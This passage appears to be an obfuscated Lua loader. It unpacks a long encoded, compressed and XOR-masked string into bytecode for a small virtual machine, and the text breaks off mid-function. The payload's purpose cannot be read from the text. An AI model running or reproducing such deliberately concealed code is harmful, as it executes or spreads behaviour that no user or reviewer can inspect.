return(function(ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIIllIIIIIllIlIlllllII)local ajefa_IIIlIlIlIlIllIIllIIIIlII=string.char;local ajefa_IlIIllIIIl=string.sub;local ajefa_lllIlllllIIlI=table.concat;local ajefa_IIIlIllIlIllII=math.ldexp;local ajefa_lIlIllIlIlIlIIIlIllIllI=getfenv or function()return _ENV end;local ajefa_lllIIllIIIIIlllIlllllII=select;local ajefa_IlIIIlIIIIlIIlllI=unpack or table.unpack;local ajefa_lIIIllIlIIIIIllIlII=tonumber;local function ajefa_llIIllIIIIlI(ajefa_IllIllll)local ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lIlllIll,ajefa_IlIIIlIIIIlIIlllI="","",{}local ajefa_IIIlIllIllllIIllIlllIIll=256;local ajefa_lIIllIlIIlllII={}for ajefa_lllIIlIllIlIllllIIlIIlll=0,ajefa_IIIlIllIllllIIllIlllIIll-1 do ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IIIlIlIlIlIllIIllIIIIlII(ajefa_lllIIlIllIlIllllIIlIIlll)end;local ajefa_lllIIlIllIlIllllIIlIIlll=1;local function ajefa_lIIIIIlIllIlllllllIIll()local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIIllIlIIIIIllIlII(ajefa_IlIIllIIIl(ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll),36)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+1;local ajefa_lIlllIll=ajefa_lIIIllIlIIIIIllIlII(ajefa_IlIIllIIIl(ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll-1),36)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll;return ajefa_lIlllIll end;ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IIIlIlIlIlIllIIllIIIIlII(ajefa_lIIIIIlIllIlllllllIIll())ajefa_IlIIIlIIIIlIIlllI[1]=ajefa_IlIIIlIllIlIlllIlIlIllll;while ajefa_lllIIlIllIlIllllIIlIIlll<#ajefa_IllIllll do local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIIIIlIllIlllllllIIll()if ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll]then ajefa_lIlllIll=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll]else ajefa_lIlllIll=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_IlIIllIIIl(ajefa_IlIIIlIllIlIlllIlIlIllll,1,1)end;ajefa_lIIllIlIIlllII[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_IlIIllIIIl(ajefa_lIlllIll,1,1)ajefa_IlIIIlIIIIlIIlllI[#ajefa_IlIIIlIIIIlIIlllI+1],ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll,ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1 end;return table.concat(ajefa_IlIIIlIIIIlIIlllI)end;local ajefa_lIIIIIlIllIlllllllIIll=ajefa_llIIllIIIIlI('26523S27523T23L27523S26J26F26Y26F27127026926E26L23T23Y27926J26Y26L26H27027J27L27527O26Z27126D27J23W27927326H26927023V27927923C25323T28027526N26H27Y23T23Z27926026C26H26P26L26Y26Z23T23N27925G26F26J26H26C28K28M28O23T23K27925R26L27025H27E26Z26L28628723S24425K28H27M27E26E27R26Y29C29D23S23T23X27926W28328P27727925N26826H26Y26H26J29L28R29429629Y26926C26K27O26E29N28729G29N25D26Z25L29W27525L26J26J26L26Z26Z27C26P27K27925C26H26E26K26C27J24D27925Q27H26K2B528P2702A82AA25J26M25N28L2AR2A527526326W26L26J26928X25H2AQ2682AV2752BQ26Z26825D26K23T24F27926Y26I26O26H2AR29626926K24Y24N24N2572542CE25925825A2CF25A2C02C22C42C629A27G2CA2CC25825824W24X25625725625B2CH2CM27U2CO2C72CR2CB24N2582552CH25825B2DD2582592D323S2C32C52D62C92D825825424X2CV25A2DD25925729H27525O2AQ27027D2AU23M29X2AY25N26F26C26C2C926L23U29P23P2792AN2AP2AR2AT26726L2AA23T24029X27126Z27026F26D26026826P26Z26928W28Y27D2BL26Y27G2AQ23T24A28J2EX2EZ2F12602F328O2F628Q29N27I27323V1I1H2FO2FO21D28A28C23S25I28F27J29N2AX27029227925D26E2ES2AY2AP23T2E42AM2702702A226827Y29K28B2AW27Q2552DX23S2AX2AZ2B12GK29327526026F2EZ27G26F26E2GL2662BM2ET26Y2572AE27522W2FS2GI2702562GL2GN2B026L2HB29R27526427C2AS23V23I24G25W1722223H22W21J2H523S2342HU29O2HT2HM2HO2HQ2HS28A24C27925M28X26C26328V26B2A72GX2ES2A127H2G028S2GA2GC26J2GE26L29K2542BI23S25L2GB2GD2GF2702GK2EF27525G26926D28426Z25P26E26H26I2B126K23U23T23T24927925H26H26O25Q26Y2F02GW26E2HJ26Y26X27127J2F92HI2732692ES2J22J42702J62J82JA26L2BZ2G923S26526W2F425L26E26N2B12HV23K29G23R2792642JX2JZ26F27328O2KD2KF29B29D22026222023T2KK2JW2JY2702KA2KC2KE2KG29D1825V2KY2FT2FZ2DW28I2752HD2B12H429O23C2HY29D2642202H525K26G2LB2H92582HC2AY2HE2582FM2FP2FO2292532HV24S25K2M52LT2LG27Q2DH2LF2GM2LX2B12DH2LC27Q2CL2MD2LH26L2CL2MI27025B2LW2GO26L2MR2MP24W2MS2HE2MX2MP24X2MY2B12N22MD25F26L26P25O2KP2GY2MD27B26E27I2A32682ED23S24A25927923T27924O24P29D2ED23U25629P29O2432792NT2NK2762NW27524O2O22NO2AE2NJ29O2NO2ED2NO2JV2NO2FT2JV2ED2HH2872OB2NW2OE23S27T23S2O52NW2NO28I2NQ2OS23S29324O25523S2OC23S2782NZ2P12P62792H52JV2802K82JV29R23O2792PD23S2IK2O123S29R2J02PK27L2OP2OR2PP23S2OU2752PS2OY2NR2PS23Q2OQ25U2OO2Q32L02452Q32MD23S25J2PL27928I23W25B2792682OM2NM2E42PJ24O25K2PI23S2802482OO2EF2E42QH2NO28S2QE2QG2NW24O2Q22E42782JG24A2PE2PK27524Z23S2E42PF2ED23Y25S2RB23S24V2OW2QY2752RJ2OF2QF2752QV2OQ2NR2R323S24B2OQ25F2RH2E42I62JV2PF2B329D2RC2P62OR2E42E424E23S24U2752E424N2NW2C12RL23S2SG2RO27925P2R02RT2P32RV2RX2RZ23S2S12752S329O2S62ED2S82RH2SB2SD2RH2QF2NO2EP2SJ2T72QP2RP23S2SO2NO2OV2RU2RW24O28I2S92SV2PK2SY2S523S2RD2OQ2SE2T32SC2TU2TF23S2412TC2SN2SP2RH2782TJ2RY2TM2SW2TR23S2S42872T02TT2SU2T42TU2RR2422U12RQ2QI2RH2QL2862TM29R2JV2QK2NP2TU2U52UF2U82TO2UB2SZ2UA2T12TU2E42NY2792E42P22T22UX2542TU24423S2Q62TH2SR2TJ2RJ2TM2462UY2RH2V72TU2VA2UW2SS2JV28S2OR2UF28S28S2NR2S22UA2752JV2EF24Q2PG2752Q02OJ2JV2KK2WB29R2QR2OJ23S2522QO2QR2ED2QR2RH2472QO2UT23S24S2W82QO2PJ2V82UO23S2WN27824R2RH2VB2VU27528S2RW2W42SX2QO29D2VZ2UA2482642RH2X22QX2TD2RR23Y2F929R2Q62OL2SJ2XP2NK2NM29R2OG2EP27L2W729D29R2P22PH24T2UV2QB29R2W12PV2TW2X92PT2Q32O427528I2YG2UF2YH2OY2YF2YC2Q02OR2YH2RJ2YO2YC24G28729R28I2ED2JV27L24I2Y52PS2Y82YC2PF2YB29324J2WU2782Z528727L2782WM27529R24H2Q32YY23S2Y42YE2Q327L2Z328I2T52PK2932PQ2752932932PU2OX31002YK310123S2YN2ZW310024K2UF2ZX23S24L2ZC31002YX2YL2Z02ZN2YH2Z32932ZB2JV2782Z82YB2S629D2TL2P62WN27L2ZI28I2JV28I2ZM2YI2YC310K2YA2PK2782ZV2SR2782ZZ2782783102311C31042UF311F24M28728I2ZE2ZT23S310H310931002Z32782SG310Q23S2VD2YB28S2P029D29328S2ZF2YC2ZI2932JV29331112OR310A311S31152WR31182TM2ZZ2TM31022TM31052SU311J2792932V93116311O2Y5311F2Z32E42NV311Y311W2WU2PF31202872ZA310U31062ZI278310N2ZL312U2SR312W23S2572WU28S31182XD2ZZ2XD31022XD312M2XD2YQ2X62QO2YT27927831232WZ2752782582QB2X023S2NM28I25425D2SR25A23S2QF2542W727824W313Y311X27824X314B31302SR24Y23S2RA314I23S25023S251314M2782WJ2532PK2E4312A2V523S2Z328S313G2YB2PF31182PF2PF2ZZ315B31002OR315E312M315E3108315G2UA310C2WX2TS2WN2E4314127L315Q31443100311X2E4314A314C2TU314G2QR315X23S314K31602RH314O314Q2TU314T314V3164314Y2PK28S31522WV31542V02ZS2W52YD2UF2EF2EF2ZZ316Q315F275316T312M316T2QN2OR316T25L28728S2EF310F2UA311P315L2PF2Z32EF310M2W923S310P2PK2KK2ZB2792PF2KK312428S2ZI2PF2W2316I315E317B312E317E31182Q02Q02ZZ317Y316U311G31812OR3181316Z317E2Q03172317K311G31762EF3178316V23S2EF2Z32Q0317D23S2KK31332JV2QR317J318G2WL313Y2UA2ZI2EF316N316I316T318J317V318M316O2OR2KK2KK2ZZ319631823199312M3199312O318G317M2PK2Q0318F3183316K2WC2W32PK2QR25M2WU2JG31332792Q02JG31242EF2ZI2Q02JV2Q0316I31812Z32KK3157319O31942752QR2QR2ZZ31AB318231AE2YN2NR31AE316Z310831AE318A317E318T2WN2Q0314128S31AQ315V2EF311X2Q0315Z314M2Q0316231B03165314L31AX23S314O2PF31B6314T25N31B32WJ25O317H313B2ZN31992Z32QR316M2752JG31182JG2JG2ZZ31BQ318231BT312M31BT2SO2OR31BT25Q2872KK319W31A8319J31AE2Z32JG318L2F925R2WU2RW318R313Y2RW31242KK2ZI2QR318P31BH2UF31C72PK2JG31BM2O131182F92F92ZZ31CV318231CY312M31CY31BY2X92F931C127931CL2P62JV2JG319J31BT2Z32F9318L2RW318O2752I631CF2JG2I631242QR2ZI2R531BN31CN31BZ23S2JG31DE313F31CD31A92SS2RW2ZZ2RW2RW310231E4311G2OR31E731D331E123S31D631DS31CH318U2JG31412KK2WN2JG2NM31B931DS31AZ311X2JG31B231ER31B431672JG31B8314M2JG314T25C31EZ2WI23S31482JV2F9316I31CY2Z32RW31CS2I631182I62I62ZZ31FG318231FJ312M31FJ25E2UF31FJ2RY2W831DN2PK2RW319J31E72Z331DK2WU2B331CC2YB2SB31CF2RW2SB31242F92ZI2RW2JV2RW312A2NR31FX2NK2742I631CS2B331182B32B32ZZ31GN318231GQ312M31GQ31FO2OR31GQ31FR2752RW2B331762I6319J31FJ2Z32B3318L2SB31DI23S2C131CF2I62C131242RW2ZI2U92I6316I31H52PK2B331A72JV2SB31182SB2SB2ZZ31HT318231HW312M31HW31GV27531HW31GY2TN31G7318U2I631412F92WN2I62NM316331DJ23S31EQ31IF31ET31IF3166314M2I631EY311X2I631F131IM31F431F62752B3316I31GQ2Z32UH2YB2C131182C12C12ZZ31J4318231J7312M31J725G2UF31J725H2872B331HF2PK2SB319J31HW2Z331HC2WU2EP31G22PK2U031CF2SB2U031242B32ZI2SB31HQ31DT31I223S2SB31JN31922XX2Y52EP2EP2ZZ31KA318231KD312M31KD31JC2OR31KD31JF2792SB2EP31762C1319J31J72Z32EP318L2U031HA2UK31CF2C12UK31242SB2ZI2C12JV2C1316I31KS2PK2EP31HP2752U031182U02U02ZZ31LG318231LJ312M31LJ31KI31LD2TZ23S31KL2752C131JW318U2C131412B32WN2C12NM2RW311X2C131EQ31482C131ET2ED2C131IL31M431B72UA31MD31IR31MD2WJ31IU23S2EP316I31KD2Z32U031CS2UK31182UK2UK2ZZ31MU318231MX312M31MX25I2UF31MX2QA2792EP31L131JS312T2ZN31LJ2Z331KY2WU2NY31JR2JV2VF31CF2U02VF31242EP2ZI2U02JV2U0316I31NC2PK2UK31CS2NY31182NY2NY2ZZ31O0318231O3312M31O331N22OR31O331N531LP2NY31762UK319J31MX2Z32NY318L2VF31HA2Q631CF2UK2Q631242U02ZI2UK2JV31MS2Y531MX31MW23S2UK310231MZ31N331P02FU31P42UK2QA311X2UK2VF2QF31OV31K231P52UK31OI31DY2YB2VF31182VF2VF2ZZ31PN318231PQ312M31PQ31O827531PQ31OB31P531NM318U2UK31412EP2WN2UK2NM2SB31PA31IG31B52752UK31IJ31P531MC31QC31ME31EO31P531MH31QH31MJ2PK2NY316I31O32Z32VF31CS2Q631182Q62Q62ZZ31QX318231R0312M31R02602UF31R02612872NY31OQ2PK2VF319J31PQ2Z331ON2WU2VN31NH2752WP31CF2VF2WP31242NY2ZI2VF2NL29E31DT28S31RF2PK2Q631CS2VN31182VN2VN2ZZ31S4318231S7312M31S731R52OR31S731R82792VF2VN31762Q6319J31R02Z32VN318L2WP31HA2O531CF2VH313631RV2ZI2Q62JV2Q6316I31SM2PK2VN31LC23S2WP31182WP2WP2ZZ31T9318231TC312M31TC31SC31RL31T623S31SF2752Q631RP318U2Q631412NY2WN2Q62NM2U0311X2Q631IH2VG23S31QE2Q631QG31U031IO31TM314S2GM314M2Q631QN2JV2VN316I31S72Z32WP31CS2O531182O52O52ZZ31UM318231UP312M31UP2622UF31UP2632872VN2O531762WP319J31TC2Z331SS2WU2NR31RK23S2W731CF2WP2W731242VN2ZI2WP2JV2WP316I31V42PK2O531CS2PY2Y52NR2NR2ZZ31VS318231VV312M31VV31UU2OR31VV31UX2792WP2NR31762O5319J31UP2Z32NR318L2W731HA2X231CF2O52X231242WP2ZI2O52JV31UK2Y531UP31UO2TT310231UR31UV2TT31W02YE2O531UX311X2O531PC31VN31PF31WA2PK2NR31T52W731182W72W72OU26631VA31XH310231XD31E827531XK31WY31XH2W731W32YE31VE318U2O531412VN2WN2O52NM2VF31X231QA31672O531QE2O531MC31482O531IO31Y931U831F231472TT31QN2OV31W623S2XG2R1316K2NR27423Y2ZI2X22NO2NO27T31UU2752AE31YW2SR27931YZ2K823S31YZ2Q031Z12792JG31Z731IF312P316K31YS275314O2O22752O92I62762GR23S2CQ27G2KE28Q2MD2EW2EY2F028Q2K825L2E92KP2632B126L26W2OC2FT28E28G2K829527026328O2722F027J2K826227126E320C26Y320E2G72PN2622IP26K28O26327R2KB2K62GH2752672832G031ZS28L28N29V2PJ320A2BB2AB2IP2HV2892IS28U2FD32142912C12BU2JJ2J327X263321M28L2JO26226H26K2692ER2M02M12FR23T2WN23S321O26D271321Q2692GX321S321U321W29O2762FT26D27Q2BS29N26W2KP320Y23S26827126N26L2RA2W42NM31ZH31K32O22T12NR2872ED31YF31YX2QP2XT2792OJ24O314T310D2OH2YC322C2O02VX31ZC323E313Z29O2Y22YU2Y5323931ZI2RH323C2S729O2WW323N31762NO31CF2O92YB2862ZB28C2NO2NR2NO317F2QB27528024A31FE32462UF2PS27L3128323O310D2932V42ZO318H2YD29R2VN31YU2UL23S324O324Q2O52NO31YF29R2Q02KK324W313Y2JG23W2VD2NO2B32OD2NM2NO32362KK31YT2ZJ323231Z32O2286324J325C318X323N2JV2UF2O031GB3232325M2OR2862862U932482Y528028031ZK323N28031242NO2Q0323U324B2OR325C324E325E2OA23S325H2UF325J2PK3176325N2P62U9286325R3232325U322Z2P62862WN2NO318T2FT3233324431ZG2O329O31Z629P324423S2722OC2L031YK2KN27028U2KQ26Y2KS2L72AF2652LP2L82LA2KZ2KL327A2L42KR2L62KU29D25Y327J29D24S327V28724M2202JD2H52KW327Y2KL328523S2LR32872WS25K313324U2FT2U0325C2SJ328G2O629D24U324U2Q32XQ2TD27L2SM31LP3244325C32742542SL326D32332NN2P7314M2O73290325G279311X32942WH329427532982Q72OK3295329D28631ZM2NW2FT329D2ZD329F2OJ329H31003291329P2O2329N329132743291287326W32542SC329L2RK2TD32A12OW287328E2NW32A12E42SJ32A6328V32972SD32942WW2OL329C329632AJ328Z32AL2NW323Z329F29N329M324L329132A332AQ311G32AW3297329U329R2O2329T32AY32722NW32B5324P329J329X329F29D326Z32BC2O2');local ajefa_lllIIlIllIlIllllIIlIIlll=(bit or bit32);local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll and ajefa_lllIIlIllIlIllllIIlIIlll.bxor or function(ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIlllIll)local ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lIIllIlIIlllII,ajefa_IlIIllIIIl=1,0,10 while ajefa_lllIIlIllIlIllllIIlIIlll>0 and ajefa_lIlllIll>0 do local ajefa_IlIIllIIIl,ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll%2,ajefa_lIlllIll%2 if ajefa_IlIIllIIIl~=ajefa_IIIlIllIllllIIllIlllIIll then ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII+ajefa_IlIIIlIllIlIlllIlIlIllll end ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll=(ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_IlIIllIIIl)/2,(ajefa_lIlllIll-ajefa_IIIlIllIllllIIllIlllIIll)/2,ajefa_IlIIIlIllIlIlllIlIlIllll*2 end if ajefa_lllIIlIllIlIllllIIlIIlll<ajefa_lIlllIll then ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIlllIll end while ajefa_lllIIlIllIlIllllIIlIIlll>0 do local ajefa_lIlllIll=ajefa_lllIIlIllIlIllllIIlIIlll%2 if ajefa_lIlllIll>0 then ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII+ajefa_IlIIIlIllIlIlllIlIlIllll end ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll=(ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_lIlllIll)/2,ajefa_IlIIIlIllIlIlllIlIlIllll*2 end return ajefa_lIIllIlIIlllII end local function ajefa_lIlllIll(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll)if ajefa_IlIIIlIllIlIlllIlIlIllll then local ajefa_lllIIlIllIlIllllIIlIIlll=(ajefa_lIlllIll/2^(ajefa_lllIIlIllIlIllllIIlIIlll-1))%2^((ajefa_IlIIIlIllIlIlllIlIlIllll-1)-(ajefa_lllIIlIllIlIllllIIlIIlll-1)+1);return ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_lllIIlIllIlIllllIIlIIlll%1;else local ajefa_lllIIlIllIlIllllIIlIIlll=2^(ajefa_lllIIlIllIlIllllIIlIIlll-1);return(ajefa_lIlllIll%(ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_lllIIlIllIlIllllIIlIIlll)>=ajefa_lllIIlIllIlIllllIIlIIlll)and 1 or 0;end;end;local ajefa_lllIIlIllIlIllllIIlIIlll=1;local function ajefa_IlIIIlIllIlIlllIlIlIllll()local ajefa_IlIIllIIIl,ajefa_IIIlIllIllllIIllIlllIIll,ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IllIllll(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+3);ajefa_IlIIllIIIl=ajefa_lIIllIlIIlllII(ajefa_IlIIllIIIl,136)ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIIllIlIIlllII(ajefa_IIIlIllIllllIIllIlllIIll,136)ajefa_lIlllIll=ajefa_lIIllIlIIlllII(ajefa_lIlllIll,136)ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIllIlIIlllII(ajefa_IlIIIlIllIlIlllIlIlIllll,136)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+4;return(ajefa_IlIIIlIllIlIlllIlIlIllll*16777216)+(ajefa_lIlllIll*65536)+(ajefa_IIIlIllIllllIIllIlllIIll*256)+ajefa_IlIIllIIIl;end;local function ajefa_lIIIllIlIIIIIllIlII()local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIllIlIIlllII(ajefa_IllIllll(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll),136);ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+1;return ajefa_IlIIIlIllIlIlllIlIlIllll;end;local function ajefa_IIIlIllIllllIIllIlllIIll()local ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lIlllIll=ajefa_IllIllll(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+2);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIllIlIIlllII(ajefa_IlIIIlIllIlIlllIlIlIllll,136)ajefa_lIlllIll=ajefa_lIIllIlIIlllII(ajefa_lIlllIll,136)ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+2;return(ajefa_lIlllIll*256)+ajefa_IlIIIlIllIlIlllIlIlIllll;end;local function ajefa_llIIllIIIIlI()local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll();local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll();local ajefa_IlIIllIIIl=1;local ajefa_lIIllIlIIlllII=(ajefa_lIlllIll(ajefa_IlIIIlIllIlIlllIlIlIllll,1,20)*(2^32))+ajefa_lllIIlIllIlIllllIIlIIlll;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIlllIll(ajefa_IlIIIlIllIlIlllIlIlIllll,21,31);local ajefa_IlIIIlIllIlIlllIlIlIllll=((-1)^ajefa_lIlllIll(ajefa_IlIIIlIllIlIlllIlIlIllll,32));if(ajefa_lllIIlIllIlIllllIIlIIlll==0)then if(ajefa_lIIllIlIIlllII==0)then return ajefa_IlIIIlIllIlIlllIlIlIllll*0;else ajefa_lllIIlIllIlIllllIIlIIlll=1;ajefa_IlIIllIIIl=0;end;elseif(ajefa_lllIIlIllIlIllllIIlIIlll==2047)then return(ajefa_lIIllIlIIlllII==0)and(ajefa_IlIIIlIllIlIlllIlIlIllll*(1/0))or(ajefa_IlIIIlIllIlIlllIlIlIllll*(0/0));end;return ajefa_IIIlIllIlIllII(ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll-1023)*(ajefa_IlIIllIIIl+(ajefa_lIIllIlIIlllII/(2^52)));end;local ajefa_IIIlIllIlIllII=ajefa_IlIIIlIllIlIlllIlIlIllll;local function ajefa_IIIIllIIlllll(ajefa_IlIIIlIllIlIlllIlIlIllll)local ajefa_lIlllIll;if(not ajefa_IlIIIlIllIlIlllIlIlIllll)then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IIIlIllIlIllII();if(ajefa_IlIIIlIllIlIlllIlIlIllll==0)then return'';end;end;ajefa_lIlllIll=ajefa_IlIIllIIIl(ajefa_lIIIIIlIllIlllllllIIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll-1);ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll+ajefa_IlIIIlIllIlIlllIlIlIllll;local ajefa_IlIIIlIllIlIlllIlIlIllll={}for ajefa_lllIIlIllIlIllllIIlIIlll=1,#ajefa_lIlllIll do ajefa_IlIIIlIllIlIlllIlIlIllll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IIIlIlIlIlIllIIllIIIIlII(ajefa_lIIllIlIIlllII(ajefa_IllIllll(ajefa_IlIIllIIIl(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lllIIlIllIlIllllIIlIIlll)),136))end return ajefa_lllIlllllIIlI(ajefa_IlIIIlIllIlIlllIlIlIllll);end;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll;local function ajefa_IIIlIllIlIllII(...)return{...},ajefa_lllIIllIIIIIlllIlllllII('#',...)end local function ajefa_IIIlIlIlIlIllIIllIIIIlII()local ajefa_lllIlllllIIlI={};local ajefa_lIIIIIlIllIlllllllIIll={};local ajefa_lllIIlIllIlIllllIIlIIlll={};local ajefa_IllIllll={[#{{712;856;40;192};"1 + 1 = 111";}]=ajefa_lIIIIIlIllIlllllllIIll,[#{"1 + 1 = 111";"1 + 1 = 111";{849;800;871;613};}]=nil,[#{{877;722;678;480};"1 + 1 = 111";{359;20;981;925};"1 + 1 = 111";}]=ajefa_lllIIlIllIlIllllIIlIIlll,[#{{339;364;315;982};}]=ajefa_lllIlllllIIlI,};local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll()local ajefa_lIIllIlIIlllII={}for ajefa_lIlllIll=1,ajefa_lllIIlIllIlIllllIIlIIlll do local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIIllIlIIIIIllIlII();local ajefa_lllIIlIllIlIllllIIlIIlll;if(ajefa_IlIIIlIllIlIlllIlIlIllll==2)then ajefa_lllIIlIllIlIllllIIlIIlll=(ajefa_lIIIllIlIIIIIllIlII()~=0);elseif(ajefa_IlIIIlIllIlIlllIlIlIllll==3)then ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_llIIllIIIIlI();elseif(ajefa_IlIIIlIllIlIlllIlIlIllll==1)then ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIIllIIlllll();end;ajefa_lIIllIlIIlllII[ajefa_lIlllIll]=ajefa_lllIIlIllIlIllllIIlIIlll;end;for ajefa_IllIllll=1,ajefa_IlIIIlIllIlIlllIlIlIllll()do local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIIllIlIIIIIllIlII();if(ajefa_lIlllIll(ajefa_lllIIlIllIlIllllIIlIIlll,1,1)==0)then local ajefa_IlIIllIIIl=ajefa_lIlllIll(ajefa_lllIIlIllIlIllllIIlIIlll,2,3);local ajefa_IlIIIlIIIIlIIlllI=ajefa_lIlllIll(ajefa_lllIIlIllIlIllllIIlIIlll,4,6);local ajefa_lllIIlIllIlIllllIIlIIlll={ajefa_IIIlIllIllllIIllIlllIIll(),ajefa_IIIlIllIllllIIllIlllIIll(),nil,nil};if(ajefa_IlIIllIIIl==0)then ajefa_lllIIlIllIlIllllIIlIIlll[#("yN5")]=ajefa_IIIlIllIllllIIllIlllIIll();ajefa_lllIIlIllIlIllllIIlIIlll[#("9I8k")]=ajefa_IIIlIllIllllIIllIlllIIll();elseif(ajefa_IlIIllIIIl==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=ajefa_IlIIIlIllIlIlllIlIlIllll();elseif(ajefa_IlIIllIIIl==2)then ajefa_lllIIlIllIlIllllIIlIIlll[#("mgK")]=ajefa_IlIIIlIllIlIlllIlIlIllll()-(2^16)elseif(ajefa_IlIIllIIIl==3)then ajefa_lllIIlIllIlIllllIIlIIlll[#("aF7")]=ajefa_IlIIIlIllIlIlllIlIlIllll()-(2^16)ajefa_lllIIlIllIlIllllIIlIIlll[#("Vqbn")]=ajefa_IIIlIllIllllIIllIlllIIll();end;if(ajefa_lIlllIll(ajefa_IlIIIlIIIIlIIlllI,1,1)==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#("q6")]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]end if(ajefa_lIlllIll(ajefa_IlIIIlIIIIlIIlllI,2,2)==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#("NsI")]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#("r8a")]]end if(ajefa_lIlllIll(ajefa_IlIIIlIIIIlIIlllI,3,3)==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#("gvLz")]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]]end ajefa_lllIlllllIIlI[ajefa_IllIllll]=ajefa_lllIIlIllIlIllllIIlIIlll;end end;for ajefa_lllIIlIllIlIllllIIlIIlll=1,ajefa_IlIIIlIllIlIlllIlIlIllll()do ajefa_lIIIIIlIllIlllllllIIll[ajefa_lllIIlIllIlIllllIIlIIlll-1]=ajefa_IIIlIlIlIlIllIIllIIIIlII();end;ajefa_IllIllll[3]=ajefa_lIIIllIlIIIIIllIlII();return ajefa_IllIllll;end;local function ajefa_lIIIllIlIIIIIllIlII(ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IllIllll,ajefa_IlIIllIIIl)ajefa_lllIIlIllIlIllllIIlIIlll=(ajefa_lllIIlIllIlIllllIIlIIlll==true and ajefa_IIIlIlIlIlIllIIllIIIIlII())or ajefa_lllIIlIllIlIllllIIlIIlll;return(function(...)local 